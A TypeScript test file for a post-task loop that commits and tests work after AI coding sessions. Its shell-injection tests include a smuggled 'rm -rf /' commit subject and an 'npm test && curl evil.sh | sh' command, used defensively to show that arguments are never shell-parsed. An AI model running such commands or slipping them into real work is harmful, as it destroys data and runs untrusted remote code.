import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { Db } from '../db/client';
import { runMigrations } from '../db/migrate';
import { schemaMigrations } from '../db/schema';
import { startTestDb, type TestDb } from '../db/testserver';
import { createProject } from '../projects/repo';
import { createTask, setStatus } from '../tasks/repo';
import { countByStatus } from './workqueue';
import {
	runPostTask,
	splitCommand,
	resolveTestCommand,
	type CommandRunner,
	type CommandResult
} from './post-task';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

// TASK 2.7 VERIFY (ARCHITECTURE §2.2/§3 step 7; D-008/D-016; D-018; DATA-MODEL §5).
//
// A completed (MOCKED) session triggers the post-task loop. We inject a FAKE CommandRunner
// (the same mocked-backend pattern 1.4/1.6b used — NO live process, NO shell) that RECORDS
// every (file, args, cwd) invocation and returns a scripted result. Everything written to
// the DB is read back from a real throwaway SurrealDB (no fabricated runtime data — F-008;
// a mock runner in a TEST is allowed). The two load-bearing proofs:
//   1. a completed session ⇒ a git commit (execFile ARRAYS) + a project test run, recorded
//      in ONE transaction (task→done + completion agent_event carrying the sha + test result).
//   2. a malformed path/arg can NOT inject a shell command — every dynamic value lands as a
//      single literal argv element, never a shell-parsed string (D-008).

let tdb: TestDb;
let db: Db;
let projectId: string;

beforeAll(async () => {
	tdb = await startTestDb();
	db = await Db.connect({
		url: tdb.wsUrl,
		username: tdb.root.username,
		password: tdb.root.password,
		namespace: tdb.namespace,
		database: tdb.database
	});
	await runMigrations(db, schemaMigrations);
	const project = await createProject(db, {
		slug: 'pt_proj',
		name: 'pt-proj',
		root_path: 'F:/code/ai-playground-v2',
		test_command: 'npm test'
	});
	projectId = project.id;
}, 60_000);

afterAll(async () => {
	await db?.close().catch(() => {});
	await tdb?.teardown();
});

/** A fake runner: records calls; returns per-program scripted results. NO live process. */
function fakeRunner(
	script: (file: string, args: readonly string[]) => CommandResult
): CommandRunner & { calls: { file: string; args: string[]; cwd: string }[] } {
	const calls: { file: string; args: string[]; cwd: string }[] = [];
	const fn = (async (file, args, opts) => {
		calls.push({ file, args: [...args], cwd: opts.cwd });
		return script(file, args);
	}) as CommandRunner & { calls: typeof calls };
	fn.calls = calls;
	return fn;
}

const OK: CommandResult = { code: 0, stdout: '', stderr: '' };

/** Create a fresh task moved to `in_progress` (the status a session runs out of). */
async function freshRunningTask(title = 'do the work'): Promise<string> {
	const t = await createTask(db, {
		project: projectId,
		title,
		description: 'post-task test task',
		status: 'ready'
	});
	await setStatus(db, t.id, 'in_progress');
	return t.id;
}

describe('post-task loop — commit + test in a transaction (2.7)', () => {
	it('a completed session commits (execFile arrays) + runs the test, recorded atomically', async () => {
		const taskId = await freshRunningTask();
		const sessionId = await makeSession(taskId);

		const runner = fakeRunner((file, args) => {
			if (file === 'git' && args[0] === 'rev-parse') return { code: 0, stdout: 'abc1234\n', stderr: '' };
			return OK;
		});

		const res = await runPostTask(
			db,
			{
				projectId,
				taskId,
				sessionId,
				cwd: 'F:/code/ai-playground-v2',
				commitMessage: 'feat: did the work',
				testCommand: 'npm test',
				runOk: true
			},
			{ run: runner }
		);

		// commit happened via execFile arrays — git add -A, git commit -m <msg>, rev-parse.
		const gitCalls = runner.calls.filter((c) => c.file === 'git');
		expect(gitCalls.map((c) => c.args[0])).toEqual(['add', 'commit', 'rev-parse']);
		// the commit message is ONE argv element after -m (never a shell string).
		const commitCall = gitCalls.find((c) => c.args[0] === 'commit')!;
		expect(commitCall.args).toEqual(['commit', '-m', 'feat: did the work']);
		expect(res.commit.ok).toBe(true);
		expect(res.commit.sha).toBe('abc1234');

		// the test command ran as program + args, split, no shell.
		const testCall = runner.calls.find((c) => c.file === 'npm')!;
		expect(testCall).toBeTruthy();
		expect(testCall.args).toEqual(['test']);
		expect(res.test.ok).toBe(true);

		// task moved to done.
		expect(res.taskStatus).toBe('done');
		expect(await readTaskStatus(taskId)).toBe('done');

		// the completion agent_event was written in the SAME transaction, carrying sha + test.
		const ev = await readAgentEvent(res.agentEventId);
		expect(ev.type).toBe('completion');
		expect(ev.detail.commit_sha).toBe('abc1234');
		expect(ev.detail.test_ok).toBe(true);
	});

	// D-018 / REPO-CREATION-SPEC integrity: the post-task loop stays LOCAL-ONLY. It must NEVER issue a
	// remote-mutating git verb (push/remote) nor a --force/-f flag. The sanctioned outward remote/push
	// lives ONLY in the gated repo-creation runner (repo-creation-gate.ts) — NEVER here. This guards the
	// invariant that the repo-creation work did NOT weaken assertLocalGit/FORBIDDEN_GIT.
	it('stays LOCAL-ONLY — never issues a remote/push/--force git op (D-018)', async () => {
		const taskId = await freshRunningTask('local-only check');
		const sessionId = await makeSession(taskId);
		const runner = fakeRunner((file, args) => {
			if (file === 'git' && args[0] === 'rev-parse') return { code: 0, stdout: 'aaa0001\n', stderr: '' };
			return OK;
		});
		await runPostTask(
			db,
			{ projectId, taskId, sessionId, cwd: 'F:/code/ai-playground-v2', commitMessage: 'feat: local only', testCommand: 'npm test', runOk: true },
			{ run: runner }
		);
		const gitCalls = runner.calls.filter((c) => c.file === 'git');
		// Only local verbs were ever issued.
		expect(gitCalls.map((c) => c.args[0]).sort()).toEqual(['add', 'commit', 'rev-parse']);
		// No forbidden remote/push verb and no force flag anywhere in the loop's git argv.
		for (const c of gitCalls) {
			expect(['push', 'remote']).not.toContain(c.args[0]);
			expect(c.args).not.toContain('--force');
			expect(c.args).not.toContain('-f');
		}
	});

	it('a failed test enqueues a follow_up work_item (off the interactive path)', async () => {
		const before = await countByStatus(db, 'pending');
		const taskId = await freshRunningTask('feature with broken tests');
		const sessionId = await makeSession(taskId);
		const runner = fakeRunner((file, args) => {
			if (file === 'git' && args[0] === 'rev-parse') return { code: 0, stdout: 'def5678\n', stderr: '' };
			if (file === 'npm') return { code: 1, stdout: '', stderr: '2 failing' };
			return OK;
		});

		const res = await runPostTask(
			db,
			{
				projectId,
				taskId,
				sessionId,
				cwd: 'F:/code/ai-playground-v2',
				commitMessage: 'feat: feature',
				testCommand: 'npm test',
				runOk: true
			},
			{ run: runner }
		);

		expect(res.test.ok).toBe(false);
		expect(res.followUpWorkId).toBeTruthy();
		expect(res.taskStatus).toBe('done'); // the run itself succeeded; tests failing → follow-up
		const after = await countByStatus(db, 'pending');
		expect(after).toBe(before + 1);
	});

	it('a failed agent run skips the commit and marks the task failed', async () => {
		const taskId = await freshRunningTask('run that failed');
		const sessionId = await makeSession(taskId);
		const runner = fakeRunner(() => OK);

		const res = await runPostTask(
			db,
			{
				projectId,
				taskId,
				sessionId,
				cwd: 'F:/code/ai-playground-v2',
				commitMessage: 'should not run',
				testCommand: 'npm test',
				runOk: false
			},
			{ run: runner }
		);

		expect(runner.calls.length).toBe(0); // no commit, no test
		expect(res.commit.attempted).toBe(false);
		expect(res.test.attempted).toBe(false);
		expect(res.taskStatus).toBe('failed');
		expect(await readTaskStatus(taskId)).toBe('failed');
	});
});

describe('post-task loop — no shell injection (D-008)', () => {
	it('a malformed path / arg is passed as ONE literal argv element, never shell-parsed', async () => {
		const taskId = await freshRunningTask('inject attempt');
		const sessionId = await makeSession(taskId);
		// An attacker-influenced commit subject with shell metacharacters.
		const evil = 'subject"; rm -rf / #';
		const runner = fakeRunner((file, args) => {
			if (file === 'git' && args[0] === 'rev-parse') return { code: 0, stdout: 'aaa\n', stderr: '' };
			return OK;
		});

		await runPostTask(
			db,
			{
				projectId,
				taskId,
				sessionId,
				cwd: 'F:/code/ai-playground-v2',
				commitMessage: evil,
				testCommand: 'npm test',
				runOk: true
			},
			{ run: runner }
		);

		// The evil subject is exactly ONE argv element (git's -m value) — never split into a
		// second command. There is no "rm" program call and no extra argv tokens.
		const commitCall = runner.calls.find((c) => c.file === 'git' && c.args[0] === 'commit')!;
		expect(commitCall.args).toEqual(['commit', '-m', evil]);
		expect(commitCall.args).toHaveLength(3);
		expect(runner.calls.some((c) => c.file === 'rm')).toBe(false);
		// no call's program is anything but git / the test launcher.
		expect(runner.calls.every((c) => c.file === 'git' || c.file === 'npm')).toBe(true);
	});

	it('a test_command with shell operators is NOT honoured — operators are inert argv tokens', () => {
		// splitCommand splits on whitespace with NO shell, so `;` `&&` `|` become literal
		// argv elements the program rejects — they can never spawn a second process.
		const split = splitCommand('npm test && curl evil.sh | sh')!;
		expect(split.file).toBe('npm');
		// every operator is just an argv token, not a shell control char.
		expect(split.args).toEqual(['test', '&&', 'curl', 'evil.sh', '|', 'sh']);
	});

	it('splitCommand returns null for an empty command', () => {
		expect(splitCommand('   ')).toBeNull();
	});
});

// ── HB-2: honest test resolution — a missing test target is a SKIP, not a pass/fail ──

describe('resolveTestCommand — honest precedence (HB-2)', () => {
	let work: string;
	beforeAll(() => {
		work = mkdtempSync(join(tmpdir(), 'resolve-test-'));
	});
	afterAll(() => {
		rmSync(work, { recursive: true, force: true });
	});
	function dirWith(name: string, files: Record<string, string>): string {
		const d = join(work, name);
		mkdirSync(d, { recursive: true });
		for (const [rel, content] of Object.entries(files)) {
			const full = join(d, rel);
			mkdirSync(join(full, '..'), { recursive: true });
			writeFileSync(full, content);
		}
		return d;
	}

	it('ROUNDS shape: dotnet build tool + stored "dotnet test" but NO test project → null (honest skip)', () => {
		const cwd = dirWith('rounds', { 'src/SWIP.csproj': '<Project Sdk="Microsoft.NET.Sdk"/>' });
		// The stored bare token WOULD false-fail — the resolver discards it.
		expect(
			resolveTestCommand({ buildTool: 'dotnet', storedTestCommand: 'dotnet test', cwd })
		).toBeNull();
	});

	it('dotnet build tool WITH a test project → resolver returns the command', () => {
		const cwd = dirWith('cs-tests', { 'tests/X.Tests.csproj': '<Project/>' });
		expect(
			resolveTestCommand({ buildTool: 'dotnet', storedTestCommand: 'dotnet test', cwd })
		).toBe('dotnet test');
	});

	it('no build tool but a hand-set custom stored command → fall back to the stored command', () => {
		const cwd = dirWith('custom', { 'scripts/check.js': '' });
		expect(
			resolveTestCommand({ buildTool: undefined, storedTestCommand: 'node scripts/check.js', cwd })
		).toBe('node scripts/check.js');
	});

	it('a build tool UNKNOWN to the resolver + stored command → honor the stored command', () => {
		const cwd = dirWith('unknown-tool', {});
		expect(
			resolveTestCommand({ buildTool: 'make', storedTestCommand: 'make check', cwd })
		).toBe('make check');
	});

	it('nothing stored and no resolvable target → null (skip)', () => {
		const cwd = dirWith('empty', { 'README.md': 'hi' });
		expect(resolveTestCommand({ buildTool: 'dotnet', storedTestCommand: undefined, cwd })).toBeNull();
		expect(resolveTestCommand({ buildTool: undefined, storedTestCommand: undefined, cwd })).toBeNull();
		expect(resolveTestCommand({ buildTool: undefined, storedTestCommand: '   ', cwd })).toBeNull();
	});
});

describe('post-task loop — null test resolution → honest skip (HB-2)', () => {
	it('no resolved test command → attempted=false ("no test target"), task still done, NO follow-up', async () => {
		const before = await countByStatus(db, 'pending');
		const taskId = await freshRunningTask('rounds task with no test target');
		const sessionId = await makeSession(taskId);
		// followUpOnTestFail ON to prove the skip never trips a follow-up (the bug HB-2 prevents).
		const runner = fakeRunner((file, args) => {
			if (file === 'git' && args[0] === 'rev-parse') return { code: 0, stdout: 'cafe123\n', stderr: '' };
			return OK;
		});

		const res = await runPostTask(
			db,
			{
				projectId,
				taskId,
				sessionId,
				cwd: 'F:/code/ai-playground-v2',
				commitMessage: 'feat: rounds work',
				// HB-2: resolveTestCommand returned null upstream → no testCommand passed.
				testCommand: undefined,
				runOk: true
			},
			{ run: runner, followUpOnTestFail: true }
		);

		// the run still committed.
		expect(res.commit.ok).toBe(true);
		// the test was NOT attempted — an honest skip, neither pass nor fail.
		expect(res.test.attempted).toBe(false);
		expect(res.test.ok).toBe(false); // not a pass
		expect(res.test.note).toBe('no test target');
		// no test program was ever spawned.
		expect(runner.calls.some((c) => c.file !== 'git')).toBe(false);
		// the task still reached done.
		expect(res.taskStatus).toBe('done');
		expect(await readTaskStatus(taskId)).toBe('done');
		// NO follow-up was enqueued (the skip is not a failure).
		expect(res.followUpWorkId).toBeUndefined();
		const after = await countByStatus(db, 'pending');
		expect(after).toBe(before);
		// the completion event records the skip honestly: test_ran=false, no test_ok pass/fail.
		const ev = await readAgentEvent(res.agentEventId);
		expect(ev.detail.test_ran).toBe(false);
		expect(ev.detail.test_ok).toBeUndefined();
		expect(ev.detail.test_note).toBe('no test target');
	});
});

// ── HB-H3: the MID-RUN divergence — task moved out of in_progress/review before/at post-task ──

describe('post-task loop — mid-run divergence is observable, never a silent false-ok (HB-H3)', () => {
	/**
	 * The RED-TEAM PROBE. The task is `in_progress` at claim (preStateEligible was true) but is
	 * CONCURRENTLY MOVED to a non-eligible status (e.g. blocked) DURING the session run, BEFORE
	 * the post-task transaction. Pre-fix runPostTask would STILL git-commit + write an ok:true
	 * completion event while the guarded terminal UPDATE silently skipped → {committed work + ok
	 * event + non-terminal task} the PM never sees. We assert that cannot happen: NO commit, NO ok
	 * completion event, a divergence `error` event names the cause, the result is honest.
	 */
	it('task moved to blocked before runPostTask → NO commit, NO ok completion, divergence error event', async () => {
		const taskId = await freshRunningTask('moved out mid-run');
		const sessionId = await makeSession(taskId);
		// The concurrent operator/PM move: in_progress → blocked (a legal, non-eligible status).
		await setStatus(db, taskId, 'blocked');

		const runner = fakeRunner((file, args) => {
			if (file === 'git' && args[0] === 'rev-parse') return { code: 0, stdout: 'dead123\n', stderr: '' };
			return OK;
		});

		const res = await runPostTask(
			db,
			{
				projectId,
				taskId,
				sessionId,
				cwd: 'F:/code/ai-playground-v2',
				commitMessage: 'feat: should NOT commit under a moved task',
				testCommand: 'npm test',
				runOk: true
			},
			{ run: runner }
		);

		// (1) divergent — the terminal transition did NOT land.
		expect(res.divergent).toBe(true);

		// (2) NO commit (and no test) was performed — the runner was never touched.
		expect(runner.calls.length).toBe(0);
		expect(res.commit.attempted).toBe(false);
		expect(res.commit.ok).toBe(false);
		expect(res.test.attempted).toBe(false);

		// (3) the task is STILL blocked — the concurrent mover owns it; we never papered over it.
		expect(await readTaskStatus(taskId)).toBe('blocked');
		expect(res.taskStatus).toBe('blocked');

		// (4) the recorded event is a divergence `error`, NOT an ok completion.
		const ev = await readAgentEvent(res.agentEventId);
		expect(ev.type).toBe('error');
		expect(ev.detail.reason).toBe('post-task-divergence-midrun');
		expect(String(ev.detail.taskId)).toBe(taskId);
		expect(ev.detail.actual_status).toBe('blocked');

		// (5) NO ok `completion` event with reason 'post-task loop' was written for this session.
		const completions = await readSessionCompletions(sessionId);
		expect(completions.length).toBe(0);
	});

	it('task moved to a FOREIGN terminal status (failed) mid-run, runOk=true → divergence, never a false done', async () => {
		const taskId = await freshRunningTask('failed-by-other mid-run');
		const sessionId = await makeSession(taskId);
		// in_progress → failed (a legal move; a concurrent actor terminally failed it). Our intended
		// terminal is 'done' (runOk=true), so landed = (failed = done) = false → divergence.
		await setStatus(db, taskId, 'failed');

		const runner = fakeRunner(() => OK);
		const res = await runPostTask(
			db,
			{
				projectId,
				taskId,
				sessionId,
				cwd: 'F:/code/ai-playground-v2',
				commitMessage: 'feat: no',
				testCommand: 'npm test',
				runOk: true
			},
			{ run: runner }
		);

		expect(res.divergent).toBe(true);
		expect(runner.calls.length).toBe(0);
		expect(await readTaskStatus(taskId)).toBe('failed'); // NOT done
		expect(res.taskStatus).toBe('failed');
		const ev = await readAgentEvent(res.agentEventId);
		expect(ev.type).toBe('error');
		expect(ev.detail.reason).toBe('post-task-divergence-midrun');
	});

	it('idempotent re-run: task ALREADY in the intended terminal status (done) → NOT a divergence, completion still recorded', async () => {
		// Interrupt contract: a partial prior run left the task `done`. Re-running post-task must
		// ABSORB that (landed via already-terminal), commit (the agent work may be uncommitted),
		// and write the completion — NOT treat the prior success as a divergence.
		const taskId = await freshRunningTask('idempotent re-run');
		const sessionId = await makeSession(taskId);
		await setStatus(db, taskId, 'done'); // the prior partial run's terminal write

		const runner = fakeRunner((file, args) => {
			if (file === 'git' && args[0] === 'rev-parse') return { code: 0, stdout: 'idem99\n', stderr: '' };
			return OK;
		});
		const res = await runPostTask(
			db,
			{
				projectId,
				taskId,
				sessionId,
				cwd: 'F:/code/ai-playground-v2',
				commitMessage: 'feat: re-run commit',
				testCommand: 'npm test',
				runOk: true
			},
			{ run: runner }
		);

		expect(res.divergent).toBe(false);
		expect(res.taskStatus).toBe('done');
		expect(await readTaskStatus(taskId)).toBe('done');
		// the commit + completion still happened (legitimate work is not stranded).
		expect(res.commit.ok).toBe(true);
		const ev = await readAgentEvent(res.agentEventId);
		expect(ev.type).toBe('completion');
		expect(ev.detail.reason).toBe('post-task loop');
	});

	it('a missing task throws (shadow path: nil/absent task) — never a silent false-ok', async () => {
		const sessionId = await makeSession(await freshRunningTask('for-session-only'));
		await expect(
			runPostTask(
				db,
				{
					projectId,
					taskId: 'task:nonexistent_abc',
					sessionId,
					cwd: 'F:/code/ai-playground-v2',
					commitMessage: 'feat: no task',
					testCommand: 'npm test',
					runOk: true
				},
				{ run: fakeRunner(() => OK) }
			)
		).rejects.toThrow(); // the THROW "task not found" rolls back the txn → a rejection, never a false-ok
	});
});

// ── small DB read-back helpers (real throwaway DB; no fabricated data) ──

async function makeSession(taskId: string): Promise<string> {
	const { StringRecordId } = await import('surrealdb');
	const [rows] = await db.query<[Array<{ id: unknown }>]>(
		`CREATE session CONTENT {
		   project: $p, task: $t, kind: "task", runtime: "claude-code",
		   model: { provider: "claude", model_id: "claude-opus-4-8", tier: "opus" }
		 } RETURN AFTER;`,
		{ p: new StringRecordId(projectId), t: new StringRecordId(taskId) }
	);
	return String(rows[0].id);
}

async function readTaskStatus(taskId: string): Promise<string> {
	const { StringRecordId } = await import('surrealdb');
	const [rows] = await db.query<[Array<{ status: string }>]>(`SELECT status FROM ONLY $t;`, {
		t: new StringRecordId(taskId)
	});
	const row = (Array.isArray(rows) ? rows[0] : rows) as { status?: string } | undefined;
	return row?.status ?? 'missing';
}

/** All `post-task loop` completion events for a session (HB-H3: assert NONE on a divergence). */
async function readSessionCompletions(
	sessionId: string
): Promise<Array<{ detail: Record<string, unknown> }>> {
	const { StringRecordId } = await import('surrealdb');
	const [rows] = await db.query<[Array<{ detail: Record<string, unknown> }>]>(
		`SELECT detail FROM agent_event WHERE type = 'completion' AND detail.reason = 'post-task loop' AND session = $sid;`,
		{ sid: new StringRecordId(sessionId) }
	);
	return rows ?? [];
}

async function readAgentEvent(
	id: string
): Promise<{ type: string; detail: Record<string, unknown> }> {
	const { StringRecordId } = await import('surrealdb');
	const [rows] = await db.query<[Array<{ type: string; detail: Record<string, unknown> }>]>(
		`SELECT type, detail FROM ONLY $e;`,
		{ e: new StringRecordId(id) }
	);
	const row = (Array.isArray(rows) ? rows[0] : rows) as
		| { type: string; detail: Record<string, unknown> }
		| undefined;
	return { type: row?.type ?? 'missing', detail: row?.detail ?? {} };
}
